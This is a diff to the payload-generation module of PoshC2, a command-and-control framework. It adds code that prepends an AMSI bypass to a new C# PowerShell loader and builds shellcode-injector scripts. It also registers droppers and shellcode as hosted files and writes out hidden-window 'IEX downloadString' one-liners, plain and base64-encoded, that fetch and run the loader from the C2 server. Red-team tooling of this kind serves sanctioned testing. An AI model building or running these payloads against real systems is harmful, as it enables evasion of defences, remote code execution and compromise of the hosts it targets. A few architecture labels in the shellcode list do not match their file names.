@@ -11,7 +11,8 @@ from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, D
 from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, PayloadDomainCheck as DefaultPayloadDomainCheck , StageRetries, StageRetriesInitialWait, StageRetriesLimit, FCommFileName as DefaultFCommFileName
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url, get_first_dfheader
-from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item, get_otherbeaconurls, get_killdate, get_defaultbeacon
+from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item, get_otherbeaconurls, get_killdate, \
+    get_defaultbeacon, insert_hosted_file
 from poshc2.server.Core import get_images
 
 
@@ -61,6 +62,8 @@ class Payloads(object):
         self.StageRetriesInitialWait = StageRetriesInitialWait
         self.PSDropper = ""
         self.PyDropper = ""
+        self.amsiBypass = ""
+        self.PSSharpLoader  = ""
         self.AllBeaconURLs=get_otherbeaconurls()
         self.AllBeaconImages=get_images()
         self.KillDate=get_killdate()
@@ -107,7 +110,9 @@ class Payloads(object):
             .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.StageRetriesLimit).lower()) \
             .replace("#REPLACESTAGERRETRIES#", str(self.StageRetries).lower()) \
             .replace("#REPLACESTAGERRETRIESWAIT#", str(self.StageRetriesInitialWait))
-
+        with open("%samsi-bypass.ps1" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+        self.amsiBypass = str(content)
     def QuickstartLog(self, txt):
         if not self.quickstart:
             self.quickstart = ''
@@ -780,20 +785,20 @@ class Payloads(object):
         self.CreateRaw(name)
         self.CreateHTA(name)
         self.CreateSCT(name)
-
         self.QuickstartLog(Colours.END)
         self.QuickstartLog(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
         self.QuickstartLog(Colours.END + "==================================" + Colours.END)
         self.CreateDroppers(name)
+        self.CreatePS(name)
         self.CreateDlls(name)
         self.CreateShellcode(name)
+        self.CreatePSInjectors(name)
         self.CreateDotNet2JS(name)
         self.CreateEXE(name)
         self.CreateMsbuild(name)
         self.CreateCsc(name)
         self.CreateDonutShellcode(name)
         self.CreateJXA(name)
-
         self.CreatePython(name)
         self.CreateDynamicCodeTemplate(name)
 
@@ -856,3 +861,70 @@ class Payloads(object):
             module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
             shellcode_function = getattr(module, "create_payloads")
             shellcode_function(self, name)
+
+    def CreatePS(self, name=""):
+
+        self.QuickstartLog(f"C# Powershell Loader: {self.BaseDirectory}{name}sharp_loader.ps1")
+        with open("%sSharp-Loader.ps1" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+        self.PSSharpLoader = str(content) \
+            .replace("#REPLACECONNECTURL#",self.FirstURL) \
+            .replace("#REPLACEQUICKCOMMAND#",self.QuickCommand) \
+            .replace("#REPLACECSHARPFILENAME#",name+"cs_drop")
+        self.PSSharpLoader = self.amsiBypass + self.PSSharpLoader
+        with open("%s%ssharp_loader.ps1" % (self.BaseDirectory, name), 'w') as f:
+            f.write(self.PSSharpLoader)
+
+        insert_hosted_file("%s%scs_drop" % (self.QuickCommand,name), "%s%sdropper_cs.exe" % (PayloadsDirectory,name), "text/html", "Yes", "Yes")
+        insert_hosted_file("%s%scs_load" % (self.QuickCommand,name), "%s%ssharp_loader.ps1" % (PayloadsDirectory,name), "text/html", "No", "Yes")
+        #
+        # with open("%sInvoke-ReflectivePEInjection.ps1" % PayloadTemplatesDirectory, 'r') as f:
+        #     content = f.read()
+        # self.PSReflectiveInjector = str(content) \
+        #     .replace("#REPLACECONNECTURL#", self.FirstURL) \
+        #     .replace("#REPLACEQUICKCOMMAND#", self.QuickCommand) \
+        #     .replace("#REPLACECSHARPFILENAME#", name + "Sharp_v4_x64.dll")
+        #
+        #
+        # insert_hosted_file("%s%sreflective_injector"% (self.QuickCommand,name), "%s%ssharp_loader.ps1" % (PayloadsDirectory,name), "text/html", "No", "Yes")
+
+        command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}cs_load')" '''
+        b64command = base64.b64encode(command.encode('UTF-16LE')).decode("UTF-8")
+        self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -c %s" % command)
+        self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % b64command)
+
+    def createPSInjector(self,b64shellcodefile,name):
+        self.QuickstartLog(f"C# Powershell Injector: {self.BaseDirectory}{name}_injector.ps1")
+
+        with open("%sInvoke-Shellcode.ps1" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+        self.PSInjector = str(content) \
+            .replace("#REPLACECONNECTURL#", self.FirstURL) \
+            .replace("#REPLACEQUICKCOMMAND#", self.QuickCommand) \
+            .replace("#REPLACEB64SHELLCODE#", name)
+
+        with open("%s%s_injector.ps1" % (self.BaseDirectory, name), 'w') as f:
+            f.write(self.PSInjector)
+
+        insert_hosted_file("%s%s_psload" % (self.QuickCommand, name), "%s%s_injector.ps1" % (PayloadsDirectory, name),
+                           "text/html", "No", "Yes")
+        insert_hosted_file("%s%s" % (self.QuickCommand, name), b64shellcodefile,
+                           "text/html", "No", "Yes")
+
+        command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}_psload')" '''
+        b64command = base64.b64encode(command.encode('UTF-16LE')).decode("UTF-8")
+        self.QuickstartLog(
+            f"Download and execute C# Powershell Injector: powershell -exec bypass -Noninteractive -windowstyle hidden -c %s" % command)
+        self.QuickstartLog(
+            f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % b64command)
+
+    def CreatePSInjectors(self, name):
+        shellcodeFiles = [("Sharp_v4_x86_Shellcode.b64", "x64"),
+                          ("Sharp_v4_x64_Shellcode.b64", "86"),
+                          ("PBindSharp_v4_x86_Shellcode.b64", "x86"),
+                          ("PBindSharp_v4_x64_Shellcode.b64", "x64"),
+                          ("FCommSharp_v4_x86_Shellcode.b64", "x86"),
+                          ("FCommSharp_v4_x64_Shellcode.b64", "x64")]
+
+        for sf in shellcodeFiles:
+            self.createPSInjector(f"{self.BaseDirectory}{name}{sf[0]}",f"{name}{sf[0]}")
